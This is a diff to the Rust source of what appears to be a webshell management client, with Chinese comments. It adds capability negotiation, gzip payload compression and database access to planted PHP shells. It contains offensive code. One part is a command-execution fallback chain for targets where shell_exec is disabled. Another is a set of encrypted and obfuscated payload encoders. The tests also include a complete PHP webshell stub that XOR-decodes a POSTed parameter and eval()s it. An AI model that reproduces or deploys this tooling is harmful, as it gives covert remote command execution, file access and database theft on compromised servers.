@@ -180,6 +180,27 @@ pub struct PhpSession {
     pub cwd: std::sync::Mutex<String>,
     /// AEAD 会话状态（仅 `native_aead`）：发送序号 + 接收滑动窗口。
     pub aead: Option<std::sync::Mutex<dosword_sdk::aead::AeadSession>>,
+    /// 目标 stub 上报的能力（`None` = 旧 stub 未上报 → 保持 v1 行为，不做拒绝）。
+    ///
+    /// 门禁语义见 `require_capability`：**只有明确上报且缺项时才拒绝**，
+    /// 避免把「旧 stub 没这个字段」误判成「不支持」。
+    pub capabilities: Option<TargetCapabilities>,
+}
+
+/// 能力门禁：仅当 stub **明确上报**了能力清单且其中不含目标能力时拒绝。
+///
+/// `None`（旧 stub 未上报 `ProtoVersion`）→ 保持 v1 旧行为，不做任何拒绝：
+/// 老 stub 仍能连、仍能用，只是享受不到新能力（例如 gzip 不会被启用）。
+/// 这与 `docs/现代化方案.md` 的兼容策略一致。
+fn require_capability(php: &PhpSession, capability: &str) -> Result<(), ProtocolError> {
+    if let Some(caps) = php.capabilities.as_ref()
+        && !caps.supports(capability)
+    {
+        return Err(ProtocolError::NotSupported(format!(
+            "目标 stub 未上报 {capability} 能力：请用当前版本重新生成并上传 stub"
+        )));
+    }
+    Ok(())
 }
 
 impl PhpSession {
@@ -221,36 +242,19 @@ const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).
 const TEMPLATE_FRAME_DIE: &str =
     r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;
 
+/// 校验驱动落在白名单内（防止把任意字符串当驱动传给目标）。
+fn check_driver(driver: &str) -> Result<(), ProtocolError> {
+    if DB_DRIVERS.contains(&driver) {
+        return Ok(());
+    }
+    Err(ProtocolError::NotSupported(format!(
+        "不支持的数据库驱动：{driver}（支持 {}）",
+        DB_DRIVERS.join(" / ")
+    )))
+}
+
 /// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
 const DB_DRIVERS: [&str; 6] = ["mysql", "pgsql", "sqlite", "mssql", "oracle", "redis"];
-
-/// 数据库探测载荷：PDO 连接 + 列出数据库。
-/// 占位符：{PWD} {DSN} {USER} {PASS} {LIST_DBS} {DBNAME} {DRIVER}
-const DB_PROBE_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}
-$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
-try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
-$q=base64_decode('{LIST_DBS}');
-if($q===''){$dbs=array(base64_decode('{DBNAME}'));}else{$dbs=array();foreach($dbh->query($q) as $r){$dbs[]=$r[0];}}
-$__r=array('ok'=>true,'data'=>array('driver'=>'{DRIVER}','databases'=>$dbs));
-}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库连接失败：'.$e->getMessage());}
-echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
-
-/// 数据库查询载荷：连接 + 执行 SQL + 结果（查询返回列与行，非查询返回影响行数）。
-/// 占位符：{PWD} {DSN} {USER} {PASS} {SQL}
-const DB_QUERY_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}
-$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
-try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
-$sql=base64_decode('{SQL}');
-$stmt=$dbh->query($sql);
-if($stmt===false){$__r=array('ok'=>false,'error'=>'SQL 执行失败');}
-elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$sql)){
-$cols=array();$n=$stmt->columnCount();for($i=0;$i<$n;$i++){$m=$stmt->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
-$rows=array();$cnt=0;
-while(($r=$stmt->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$row=array();foreach($r as $v){$row[]=($v===null)?null:(string)$v;}$rows[]=$row;$cnt++;}
-$__r=array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0));
-}else{$__r=array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$stmt->rowCount()));}
-}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库操作失败：'.$e->getMessage());}
-echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
 
 // ---------------------------------------------------------------------------
 // 请求调试：统一走 protocol::reqlog（环缓冲，密码脱敏，记录全部协议帧）。
@@ -288,6 +292,8 @@ impl PhpProtocol {
                     encoder,
                     &effective_password(&profile.protocol_params, &profile.password),
                 ),
+                // 探测用的临时会话：能力由 probe 响应决定，随后写回真实会话
+                capabilities: None,
             };
             return self.session_probe(&php, settings);
         }
@@ -309,12 +315,24 @@ impl PhpProtocol {
                     encoder,
                     &effective_password(&profile.protocol_params, &profile.password),
                 ),
+                capabilities: None,
             };
             return self.session_probe(&php, settings);
         }
+        // info 表：能力协商（ProtoVersion/Capabilities）与内存马前置判定
+        // （PHP_SAPI / user_ini_filename / DOCUMENT_ROOT）都依赖它，
+        // 旧实现只回 9 个扁平字段，导致 legacy 通道「看起来不支持任何能力」。
+        // 能力串去掉 gzip：legacy 通道的请求由**已部署的 stub** 解包，而旧 stub
+        // 不会 gunzip（stub 版本在客户端不可知）——客户端在这条通道上也确实不压缩。
+        // 分阶段载荷的 gzip 由每次注入的处理器解压，那条通道才报 gzip。
+        let info = dosword_sdk::php_impl::PHP_INFO_IMPL.replace(
+            "chunked,stream,db,plugin,exec,gzip",
+            "chunked,stream,db,plugin,exec",
+        );
         let code = format!(
-            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>php_uname('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>(string)ini_get('disable_functions')));{}",
+            "{}\n{}\n$__r=array('ok'=>true,'data'=>array('server'=>$info['OsInfo'],'web_server'=>$info['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>@getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>$info['ProcessArch'],'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>$info['disable_functions'],'info'=>$info));{}",
             Self::build_prefix(encoder, &profile.password),
+            info,
             TEMPLATE_FRAME
         );
         let client = match reused_client {
@@ -413,6 +431,8 @@ impl PhpProtocol {
                 .unwrap_or("未知")
                 .to_string()
         };
+        // 能力协商：分阶段处理器的 probe 也上报 ProtoVersion/Capabilities
+        let info = info_map(&value);
         Ok(ProbeResult {
             status: "online".to_string(),
             server: get("server"),
@@ -433,8 +453,8 @@ impl PhpProtocol {
                 })
                 .unwrap_or_default(),
             disable_functions: get("disable_functions"),
-            capabilities: None,
-            info: info_map(&value),
+            capabilities: TargetCapabilities::from_info(&info),
+            info,
         })
     }
 
@@ -889,6 +909,8 @@ impl Protocol for PhpProtocol {
                 code.len()
             )));
         }
+        // 能力门禁：插件/代码通道依赖 stub 的 eval 能力（旧 stub 未上报 → 不拒绝）
+        require_capability(php, "exec")?;
         // 1) S2：优先 eval 通道（单次往返、无临时文件落地）
         //    载荷剥离 <?php 后直接经 dispatch eval 执行（eval_fn try/catch 包裹）。
         //    失败（代码致命错误/目标不支持 eval）时降级临时文件通道。
@@ -1003,6 +1025,7 @@ impl Protocol for PhpProtocol {
                 encoder,
                 &effective_password(&profile.protocol_params, &profile.password),
             ),
+            capabilities: result.capabilities.clone(),
         });
         Ok((session, result))
     }
@@ -1021,9 +1044,14 @@ impl Protocol for PhpProtocol {
             return self.session_exec(php, command, settings);
         }
         let cmd_b64 = B64.encode(command.as_bytes());
+        // 与 NATIVE / 分阶段通道共用同一份实现：命令函数降级链（shell_exec →
+        // exec → system/passthru → popen）、`cd` 前缀、cwd 回传。
+        // 旧实现硬用 `@shell_exec`，目标禁用 shell_exec 时命令通道直接死。
+        let dir_b64 = B64.encode(php.current_dir().as_bytes());
         let code = format!(
-            "{}\n$c=base64_decode('{cmd_b64}');$o=@shell_exec($c.' 2>&1');$__r=array('ok'=>true,'data'=>array('stdout'=>base64_encode((string)$o),'cwd'=>getcwd()));{}",
+            "{}\n$c=base64_decode('{cmd_b64}');$w=base64_decode('{dir_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('stdout'=>$stdout,'cwd'=>$cwd)):array('ok'=>false,'error'=>$err);{}",
             Self::build_prefix(php.encoder, &php.password),
+            dosword_sdk::php_impl::PHP_EXEC_IMPL,
             TEMPLATE_FRAME
         );
         let start = Instant::now();
@@ -1050,6 +1078,9 @@ impl Protocol for PhpProtocol {
             .pointer("/data/cwd")
             .and_then(|v| v.as_str())
             .map(str::to_string);
+        if let Some(ref dir) = cwd {
+            php.update_cwd(dir);
+        }
 
         Ok(CommandOutput {
             stdout,
@@ -1074,9 +1105,9 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$s=@stat($full);$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>($is_dir||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
+            "{}\n$p=base64_decode('{path_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('entries'=>$entries)):array('ok'=>false,'error'=>$err);{}",
             Self::build_prefix(php.encoder, &php.password),
-            TEMPLATE_FRAME_DIE,
+            dosword_sdk::php_impl::PHP_SCAN_IMPL,
             TEMPLATE_FRAME
         );
         let value = self.send_frame(
@@ -1456,31 +1487,23 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        require_capability(php, "db")?;
         if is_session(php) {
             return self.session_db_probe(php, connection, settings);
         }
         let driver = connection.driver.clone();
-        let dsn = build_dsn(connection, false)?;
-        let list_dbs = match driver.as_str() {
-            "mysql" => "SHOW DATABASES".to_string(),
-            "pgsql" => "SELECT datname FROM pg_database".to_string(),
-            _ => String::new(),
-        };
-        let code = Self::build_code(
-            DB_PROBE_CODE,
-            &[
-                ("PARAM_K", encoder_form_key(php.encoder)),
-                (
-                    "PWD",
-                    &crate::protocol::transport::php_single_quote(&php.password),
-                ),
-                ("DSN", &B64.encode(dsn.as_bytes())),
-                ("USER", &B64.encode(conn_user(connection))),
-                ("PASS", &B64.encode(conn_pass(connection))),
-                ("LIST_DBS", &B64.encode(list_dbs.as_bytes())),
-                ("DBNAME", &B64.encode(conn_dbname(connection))),
-                ("DRIVER", &driver),
-            ],
+        // 与 NATIVE / 分阶段通道同构：连接参数（JSON）交给 stub 端实现，
+        // 6 个驱动（含 mssql/oracle/redis）走同一份代码。
+        // 旧实现只在客户端拼 PDO DSN，redis 直接被拒、mssql/oracle 列不出库。
+        check_driver(&driver)?;
+        let conn_b64 = B64.encode(conn_json(connection).as_bytes());
+        let code = format!(
+            "{}\n{}\n$c=base64_decode('{conn_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$databases)):array('ok'=>false,'error'=>$err);{}",
+            Self::build_prefix(php.encoder, &php.password),
+            // redis 走裸 RESP，需要 dsw_rsp / dsw_rcmd 辅助（function_exists 守卫，可重复注入）
+            dosword_sdk::php_impl::PHP_REDIS_HELPERS,
+            dosword_sdk::php_impl::PHP_DB_PROBE_IMPL,
+            TEMPLATE_FRAME
         );
         let value = self.send_frame(
             &php.client,
@@ -1519,23 +1542,19 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        require_capability(php, "db")?;
         if is_session(php) {
             return self.session_db_query(php, connection, sql, settings);
         }
-        let dsn = build_dsn(connection, true)?;
-        let code = Self::build_code(
-            DB_QUERY_CODE,
-            &[
-                ("PARAM_K", encoder_form_key(php.encoder)),
-                (
-                    "PWD",
-                    &crate::protocol::transport::php_single_quote(&php.password),
-                ),
-                ("DSN", &B64.encode(dsn.as_bytes())),
-                ("USER", &B64.encode(conn_user(connection))),
-                ("PASS", &B64.encode(conn_pass(connection))),
-                ("SQL", &B64.encode(sql.as_bytes())),
-            ],
+        check_driver(&connection.driver)?;
+        let conn_b64 = B64.encode(conn_json(connection).as_bytes());
+        let sql_b64 = B64.encode(sql.as_bytes());
+        let code = format!(
+            "{}\n{}\n$c=base64_decode('{conn_b64}');$q=base64_decode('{sql_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected)):array('ok'=>false,'error'=>$err);{}",
+            Self::build_prefix(php.encoder, &php.password),
+            dosword_sdk::php_impl::PHP_REDIS_HELPERS,
+            dosword_sdk::php_impl::PHP_DB_QUERY_IMPL,
+            TEMPLATE_FRAME
         );
         let start = Instant::now();
         let value = self.send_frame(
@@ -1595,71 +1614,6 @@ impl Protocol for PhpProtocol {
             affected,
             duration_ms,
         })
-    }
-}
-
-/// 编码器的密码参数名（业务伪装模板为 token）。
-fn encoder_form_key(encoder: &dyn PayloadEncoder) -> &'static str {
-    let (key_param, _) = encoder.form_params();
-    key_param
-}
-
-/// 校验驱动白名单并构造 PDO DSN。
-/// `use_db` 为 true 时把 dbname 并入 DSN（查询语句需要选定数据库）。
-fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, ProtocolError> {
-    if !DB_DRIVERS.contains(&connection.driver.as_str()) {
-        return Err(ProtocolError::NotSupported(format!(
-            "不支持的数据库驱动：{}（支持 {}）",
-            connection.driver,
-            DB_DRIVERS.join(" / ")
-        )));
-    }
-    let host = connection.host.as_deref().unwrap_or("");
-    let port = connection.port.unwrap_or(match connection.driver.as_str() {
-        "pgsql" => 5432,
-        "mssql" => 1433,
-        "oracle" => 1521,
-        "redis" => 6379,
-        _ => 3306,
-    });
-    let dbname = connection.dbname.as_deref().unwrap_or("");
-    match connection.driver.as_str() {
-        "sqlite" => {
-            if dbname.is_empty() {
-                return Err(ProtocolError::ServerError(
-                    "SQLite 模式需要在「数据库」字段填写目标文件路径".into(),
-                ));
-            }
-            Ok(format!("sqlite:{dbname}"))
-        }
-        "mysql" => {
-            let mut dsn = format!("mysql:host={host};port={port};charset=utf8mb4");
-            if use_db && !dbname.is_empty() {
-                dsn.push_str(&format!(";dbname={dbname}"));
-            }
-            Ok(dsn)
-        }
-        "pgsql" => {
-            let db = if dbname.is_empty() {
-                "postgres"
-            } else {
-                dbname
-            };
-            Ok(format!("pgsql:host={host};port={port};dbname={db}"))
-        }
-        // 旧实现对未知驱动（mssql/oracle/redis）静默生成 pgsql DSN，
-        // 表现为「连上了但行为不对」。这里显式分派。
-        "mssql" => Ok(format!("sqlsrv:Server={host},{port};Database={dbname}")),
-        "oracle" => Ok(format!(
-            "oci:dbname=//{host}:{port}/{}",
-            if dbname.is_empty() { "ORCL" } else { dbname }
-        )),
-        "redis" => Err(ProtocolError::NotSupported(
-            "Redis 不使用 PDO；该驱动仅在支持 NATIVE 编码器的 Shell 上可用".into(),
-        )),
-        other => Err(ProtocolError::NotSupported(format!(
-            "不支持的数据库驱动：{other}"
-        ))),
     }
 }
 
@@ -1792,9 +1746,28 @@ fn session_call(
     }
     request.push('}');
 
-    // session 变体（分阶段载荷）暂不启用 gzip（响应为明文 JSON，结构不兼容压缩）
-    let payload = encode_payload(php, &request)?;
+    // gzip：分阶段载荷在**明文层**压缩，包成 {"n":..,"z":1,"d":base64(gzip(原请求))}。
+    // 处理器是客户端每次连接注入的，所以这条路径不受目标上已部署 stub 版本影响；
+    // 压缩位置放在明文层而非密文层：密文是高频熵数据，gzip 收益接近零，
+    // 而 base64 载荷（上传/下载分块）的 33% 膨胀可以被真正收回。
+    let gzip_ok = php
+        .capabilities
+        .as_ref()
+        .map(|caps| caps.supports("gzip"))
+        .unwrap_or(true);
+    let mut sent = request.clone();
+    if settings.gzip_enabled && gzip_ok && request.len() >= 1024 {
+        let encoded = B64.encode(request.as_bytes());
+        let packed = crate::protocol::transport::gzip_payload(&encoded, true);
+        // 压缩无收益（高熵内容）时按原样发送，避免"压缩后更大"
+        if packed != encoded {
+            sent = format!("{{\"n\":\"{nonce}\",\"z\":1,\"d\":\"{packed}\"}}");
+        }
+    }
+    let payload = encode_payload(php, &sent)?;
     let plain = session_post(php, action, &request, payload, settings)?;
+    // 响应：处理器可能把帧内容先 gzip 再 base64（按魔数识别，无需版本协商）
+    let plain = crate::protocol::transport::gunzip_bytes_if_needed(plain);
     let text = String::from_utf8_lossy(&plain);
 
     // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
@@ -1836,7 +1809,15 @@ fn native_call(
     request.push('}');
 
     let payload = encode_payload(php, &request)?;
-    let payload = crate::protocol::transport::gzip_payload(&payload, settings.gzip_enabled);
+    // gzip：stub 明确上报了能力清单但**不含** gzip 时不压缩（新 stub 会带上 gzip；
+    // 旧 stub 未上报 → None → 保持既有行为，避免把"没这个字段"当成"不支持"）
+    let gzip_ok = php
+        .capabilities
+        .as_ref()
+        .map(|caps| caps.supports("gzip"))
+        .unwrap_or(true);
+    let payload =
+        crate::protocol::transport::gzip_payload(&payload, settings.gzip_enabled && gzip_ok);
     // base64 载荷可能含 +/=，必须转义（否则 PHP 表单解析时 + 转空格损坏密文）；
     // P2：手动快速转义（仅 +、=、&），避免对整块载荷全量百分号编码
     let body = format!("formData={}", form_escape(&payload));
@@ -1917,18 +1898,6 @@ fn dispatch(
 
 fn conn_json(connection: &DbConnection) -> String {
     serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
-}
-
-fn conn_user(connection: &DbConnection) -> String {
-    connection.username.as_deref().unwrap_or("").to_string()
-}
-
-fn conn_pass(connection: &DbConnection) -> String {
-    connection.password.as_deref().unwrap_or("").to_string()
-}
-
-fn conn_dbname(connection: &DbConnection) -> String {
-    connection.dbname.as_deref().unwrap_or("").to_string()
 }
 
 // ---------------------------------------------------------------------------
@@ -2123,21 +2092,44 @@ mod tests {
 
     #[test]
     fn real_php_all_encoders_round_trip() {
-        // 每个编码器的生成 stub 都做真实执行验证（防止模板双重调用等 bug 漏网）
-        let encoders = [
-            "native",
-            "native_aes_ecb",
-            "native_aes_cbc",
-            "native_des",
-            "native_chacha20",
-            "native_rabbit",
-        ];
+        // 每个**已注册**编码器的生成 stub 都做真实执行验证。
+        //
+        // 历史缺口：本测试只遍历 6 个 native 变体，8 个 legacy 编码器
+        // （base64 / xor_base64 / char / php_obfuscate / php_stream / xor_body /
+        // xor_session / des）与 custom 从未做过端到端验证 —— 用户却能在生成器里
+        // 选到它们。现在改为遍历注册表，并对每个编码器跑完整操作面
+        // （命令 / 目录列举 / 整文件读写 / 偏移分块读写）。
+        let encoder_ids: Vec<String> = dosword_sdk::EncoderRegistry::global()
+            .list()
+            .into_iter()
+            .map(|(id, _)| id)
+            .collect();
+        assert!(
+            encoder_ids.len() >= 16,
+            "注册表应含全部编码器：{encoder_ids:?}"
+        );
+        // custom 编码器的 stub 由用户上传，客户端只规定**载荷编解码**
+        // （base64(XOR(代码, md5(密码)))）与**表单参数名**（`k` = 密码，`x` = 载荷，
+        // 经典蚁剑形态）；上传的 stub 必须同时满足这两点，否则会拿到
+        // 401/AUTH_FAIL 或「响应中未找到协议帧」。这里用一份最小契约 stub 作模板。
+        dosword_sdk::encoder::set_custom_stub(
+            r#"<?php
+@ini_set('display_errors','0');@error_reporting(0);
+if(!isset($_POST['k'])||!isset($_POST['x'])){die('AUTH_FAIL');}
+$key=md5($_POST['k']);
+$raw=base64_decode($_POST['x']);
+$code='';
+for($i=0;$i<strlen($raw);$i++){$code.=$raw[$i]^$key[$i%strlen($key)];}
+@eval($code);
+"#,
+        )
+        .expect("注册 custom 测试模板");
+
         let settings = settings();
-        for encoder_id in encoders {
-            if encoder_id == "native_des" && !php_supports_des_ecb() {
-                eprintln!(
-                    "跳过 native_des：当前 php 的 OpenSSL 不支持 DES-ECB（OpenSSL 3 需加载 legacy provider）"
-                );
+        for encoder_id in &encoder_ids {
+            // DES-ECB 需要 OpenSSL legacy provider（OpenSSL 3 默认不加载）
+            if encoder_id.contains("des") && !php_supports_des_ecb() {
+                eprintln!("跳过 {encoder_id}：当前 php 的 OpenSSL 不支持 DES-ECB");
                 continue;
             }
             let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
@@ -2147,23 +2139,99 @@ mod tests {
             };
             let mut profile = profile(&url);
             profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
-            let result = (|| -> Result<String, ProtocolError> {
-                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+            let result = (|| -> Result<(), ProtocolError> {
+                let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
+                assert_eq!(probe.status, "online", "{encoder_id} 探测失败");
+
+                // 1) 命令执行
                 let output =
                     PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
-                Ok(output.stdout)
+                assert_eq!(output.stdout.trim(), "enc-ok", "{encoder_id} 命令输出不符");
+
+                // 2) 目录列举：验证 stat 合并后 perms/size/mtime 仍在
+                //    （hello.txt 在文档根的子目录 www 下，顺带覆盖目录项）
+                let listing = PhpProtocol.list_dir(
+                    session.as_ref(),
+                    &dir.join("www").display().to_string(),
+                    &settings,
+                )?;
+                let hello = listing
+                    .entries
+                    .iter()
+                    .find(|entry| entry.name == "hello.txt")
+                    .unwrap_or_else(|| panic!("{encoder_id} 目录列举缺少 hello.txt"));
+                assert!(!hello.is_dir, "{encoder_id} hello.txt 不应是目录");
+                assert_eq!(
+                    hello.size,
+                    "hello dosword".len() as u64,
+                    "{encoder_id} 文件大小不符"
+                );
+                assert!(
+                    !hello.perms.is_empty(),
+                    "{encoder_id} perms 为空（stat 合并丢字段）"
+                );
+                assert!(
+                    !hello.modified.is_empty(),
+                    "{encoder_id} mtime 为空（stat 合并丢字段）"
+                );
+                let parent = PhpProtocol.list_dir(
+                    session.as_ref(),
+                    &dir.display().to_string(),
+                    &settings,
+                )?;
+                let www = parent
+                    .entries
+                    .iter()
+                    .find(|entry| entry.name == "www")
+                    .unwrap_or_else(|| panic!("{encoder_id} 目录列举缺少 www"));
+                assert!(www.is_dir, "{encoder_id} www 应是目录");
+                assert_eq!(www.size, 0, "{encoder_id} 目录 size 应为 0");
+                assert!(!www.perms.is_empty(), "{encoder_id} 目录 perms 为空");
+
+                // 3) 整文件写入 + 读回（含非 ASCII 与二进制字节）
+                let payload: Vec<u8> = "第一段-utf8".bytes().chain([0u8, 255, 1, 2]).collect();
+                let target = format!("{}/enc-{encoder_id}.bin", dir.display());
+                PhpProtocol.write_file(session.as_ref(), &target, &payload, &settings)?;
+                assert_eq!(
+                    PhpProtocol.read_file(session.as_ref(), &target, &settings)?,
+                    payload,
+                    "{encoder_id} 整文件读写不一致"
+                );
+
+                // 4) 偏移分块读写（需要 stub 上报 ChunkedTransfer）
+                let mut offset = 0u64;
+                for chunk in [b"alpha".to_vec(), vec![0u8, 1, 254], b"omega".to_vec()] {
+                    PhpProtocol.write_chunk(
+                        session.as_ref(),
+                        &target,
+                        &chunk,
+                        offset,
+                        &settings,
+                    )?;
+                    offset += chunk.len() as u64;
+                }
+                let expected: Vec<u8> =
+                    [b"alpha".to_vec(), vec![0u8, 1, 254], b"omega".to_vec()].concat();
+                assert_eq!(
+                    PhpProtocol.read_file(session.as_ref(), &target, &settings)?,
+                    expected,
+                    "{encoder_id} 顺序分块写入结果不符"
+                );
+                let slice = PhpProtocol.read_chunk(session.as_ref(), &target, 2, 5, &settings)?;
+                assert_eq!(slice, expected[2..7].to_vec(), "{encoder_id} 偏移读取不符");
+                Ok(())
             })();
             let _ = child.kill();
             let _ = child.wait();
-            let stdout = result.unwrap_or_else(|error| {
+            if let Err(error) = result {
                 let _ = std::fs::copy(
                     dir.join("shell.php"),
                     std::env::temp_dir().join(format!("failed_{encoder_id}.php")),
                 );
+                let _ = std::fs::remove_dir_all(&dir);
                 panic!("{encoder_id} 真实执行应成功：{error}");
-            });
+            }
             let _ = std::fs::remove_dir_all(&dir);
-            assert_eq!(stdout.trim(), "enc-ok", "{encoder_id} 输出不符");
         }
     }
 
@@ -2251,6 +2319,109 @@ mod tests {
         }
     }
 
+    /// gzip：分阶段载荷在**明文层**压缩（`{"n":..,"z":1,"d":base64(gzip(请求))}`），
+    /// 大载荷必须能往返；同时验证关闭 gzip 时同一条通道仍然可用（非信封路径）。
+    ///
+    /// 用 8KB 高度可压缩内容：gzip 必然比原文小，因此压缩分支一定被走到
+    /// （`gzip_payload` 在无收益时会退回原文）。响应方向同理（帧内容 > 512 字节
+    /// 时处理器才压缩），客户端按 gzip 魔数识别。
+    #[test]
+    fn real_php_session_gzip_round_trip() {
+        for gzip_enabled in [true, false] {
+            let mut settings = settings();
+            settings.gzip_enabled = gzip_enabled;
+            let Some((url, dir, mut child)) = spawn_php_server_with("xor_session", "secret", false)
+            else {
+                eprintln!("跳过：未检测到 php 可执行文件");
+                return;
+            };
+            let mut profile = profile(&url);
+            profile.protocol_params = r#"{"encoder":"xor_session"}"#.to_string();
+            let result = (|| -> Result<(), ProtocolError> {
+                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+                let payload = "A".repeat(8 * 1024).into_bytes();
+                let target = format!("{}/gzip-{gzip_enabled}.bin", dir.display());
+                PhpProtocol.write_chunk(session.as_ref(), &target, &payload, 0, &settings)?;
+                let read = PhpProtocol.read_chunk(
+                    session.as_ref(),
+                    &target,
+                    0,
+                    payload.len() as u64,
+                    &settings,
+                )?;
+                assert_eq!(read, payload, "gzip={gzip_enabled} 往返不一致");
+                Ok(())
+            })();
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+            result
+                .unwrap_or_else(|error| panic!("分阶段载荷 gzip={gzip_enabled} 往返失败：{error}"));
+        }
+    }
+
+    /// 旧 stub 兼容（能力协商的单向降级）：目标上跑的是**旧版本 stub**
+    /// （不报 `ProtoVersion` / `Capabilities` / `ChunkedTransfer`）时，
+    /// 必须保持 v1 行为 —— 能连、命令与文件照常可用、分块请求给出
+    /// 「请重新生成 stub」的明确提示，而不是被能力门禁一刀切拒绝。
+    #[test]
+    fn old_stub_without_capabilities_keeps_v1_behaviour() {
+        let settings = settings();
+        let encoder = dosword_sdk::EncoderRegistry::global()
+            .get("native")
+            .expect("native 编码器");
+        // 模拟旧 stub：抹掉能力上报字段（其余代码与当前版本一致）
+        let stub = encoder
+            .stub("php", "secret")
+            .expect("生成 stub")
+            .replace("'ChunkedTransfer'=>'1',", "")
+            .replace("'ProtoVersion'=>'2',", "")
+            .replace("'Capabilities'=>'chunked,stream,db,plugin,exec,gzip',", "")
+            .replace("'ShellType'=>'file',", "");
+        assert!(!stub.contains("ProtoVersion"), "测试前提：能力字段应已抹除");
+        let Some((url, dir, mut child)) = spawn_php_server_stub(&stub, "native", false) else {
+            eprintln!("跳过：未检测到 php 可执行文件");
+            return;
+        };
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
+            assert!(
+                probe.capabilities.is_none(),
+                "旧 stub 不应上报能力：{:?}",
+                probe.capabilities
+            );
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+            assert!(!php.chunked, "旧 stub 未上报 ChunkedTransfer");
+
+            // 能力门禁不得误伤：命令与文件照常可用
+            let output =
+                PhpProtocol.execute_command(session.as_ref(), "printf old-ok", &settings)?;
+            assert_eq!(output.stdout.trim(), "old-ok");
+            let target = format!("{}/old-stub.txt", dir.display());
+            PhpProtocol.write_file(session.as_ref(), &target, b"legacy", &settings)?;
+            assert_eq!(
+                PhpProtocol.read_file(session.as_ref(), &target, &settings)?,
+                b"legacy"
+            );
+
+            // 分块：明确拒绝并提示重新生成 stub（而不是发出去必然失败）
+            let error = PhpProtocol
+                .read_chunk(session.as_ref(), &target, 0, 4, &settings)
+                .unwrap_err();
+            assert!(error.to_string().contains("重新生成"), "{error}");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("旧 stub 兼容用例失败：{error}"));
+    }
+
     /// 生成物结构断言：不依赖 php 也能跑，防止能力标记与偏移参数被误删。
     #[test]
     fn native_stub_advertises_chunked_transfer_and_offsets() {
@@ -2280,7 +2451,7 @@ mod tests {
             "分阶段处理器的 probe 必须上报分块能力"
         );
         assert!(
-            handler.contains("$l > 0 ? $l : null"),
